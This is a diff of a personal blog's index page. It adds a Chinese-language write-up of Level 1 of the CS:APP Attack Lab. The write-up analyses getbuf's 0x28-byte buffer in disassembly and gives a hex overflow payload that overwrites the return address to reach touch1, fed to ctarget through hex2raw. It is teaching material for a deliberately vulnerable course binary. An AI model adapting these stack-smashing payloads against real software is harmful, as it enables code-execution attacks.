@@ -133,7 +133,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -181,6 +181,100 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://liyun-666.github.io/2022/04/09/2022-4-9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="黎酝">
+      <meta itemprop="description" content="爱意东升日落，浪漫至死不渝">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="黎酝的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/09/2022-4-9/" class="post-title-link" itemprop="url">lab3 Attacklab</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-09 07:11:07" itemprop="dateCreated datePublished" datetime="2022-04-09T07:11:07+08:00">2022-04-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CSAPP/" itemprop="url" rel="index"><span itemprop="name">CSAPP</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在进行本次实验之前，需要仔细阅读 <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">实验讲义 Writeup</a>，它会给予我们许多帮助。</p>
+<p>与上一个实验一样，我们可以先使用 <code>objdump</code> 查看汇编代码。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.asm</span><br><span class="line">objdump -d rtarget &gt; rtarget.asm</span><br></pre></td></tr></table></figure>
+
+<p>讲义中给出了本次攻击实验的关键函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>getbuf</code> 函数首先定义了局部变量 <code>buf</code>，然后调用 <code>Gets</code> 函数，从标准输入中读取字符至 <code>buf</code> 中，由于没有对长度进行严格的检查，读取的字符数可能会超过 <code>BUFFER_SIZE</code>，从而破坏了 <code>getbuf</code> 函数甚至函数之外的栈帧结构。</p>
+<h2 id="Part-1-代码注入攻击"><a href="#Part-1-代码注入攻击" class="headerlink" title="Part 1: 代码注入攻击"></a>Part 1: 代码注入攻击</h2><p>代码注入攻击就是通过读取超过 <code>BUFFER_SIZE</code> 长度的字符对函数栈帧的返回地址进行了修改，从而使得 <code>retq</code> 指令没有正常的返回，而使 <code>IP</code> 指向了未知的地方，执行了未知的指令。</p>
+<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p><code>Level 1</code> 不需要我们注入攻击代码，只需要我们执行程序本身自带的函数 <code>touch1</code> 即可。</p>
+<p>下面是调用 <code>getbuf</code> 和 <code>touch1</code> 的代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看看 <code>getbuf</code> 的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>
+<p>栈指针减 <code>0x28</code>，然后栈 rsp 赋值给 rdi，rdi 作为参数调用 <code>Gets</code>，所以 <code>getbuf</code> 中 <code>BUFFER_SIZE</code> 应该就是 <code>0x28</code>，大于 <code>0x28</code> 的 8 个字节作为返回地址，所以将 <code>0x28</code> 后面的 8 个字节更改为 <code>touch1</code> 的函数入口地址即可。前面的 <code>0x28</code> 个字节可以是任意字符，这里就全设为 00 即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>最后一个字节就是入口地址(小端序)。将这段序列写入文件 <code>1-1.txt</code> 中，使用 <code>hex2raw</code> 程序帮助我们生成字符串。</p>
+<blockquote>
+<p>./hex2raw -i 1-1.txt | ./ctarget -q</p>
+</blockquote>
+<p><img src="/2022/04/09/2022-4-9/2022-4-9_1.png"></p>
+<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -920,83 +1014,6 @@
             </div>
           <!--/noindex-->
         
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://liyun-666.github.io/2022/01/17/2022-1-17/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="黎酝">
-      <meta itemprop="description" content="爱意东升日落，浪漫至死不渝">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="黎酝的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/01/17/2022-1-17/" class="post-title-link" itemprop="url">my desktop environment</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-01-17 21:00:00" itemprop="dateCreated datePublished" datetime="2022-01-17T21:00:00+08:00">2022-01-17</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/moments/" itemprop="url" rel="index"><span itemprop="name">moments</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Today I wanna share with you guys about my desktop environment:</p>
-<p><img src="/2022/01/17/2022-1-17/2022-1-17_1.png"></p>
-<p><img src="/2022/01/17/2022-1-17/2022-1-17_2.png"></p>
-<p>It is Arch Linux OS. I install KDE and use Layan global theme. Konsole is changed by oh-my-zsh. Other plugins… I just forgot… forgive me please. You can search “how to beautify your KDE” if you get interested in it. Arch Wiki shows you how to install softwares such as Wechat, Google Chrome, develop tools…</p>
-<p>If you’re curious about how I configure in detail, welcome to communicate with me. My QQ is : 2389231032.</p>
-
       
     </div>
 
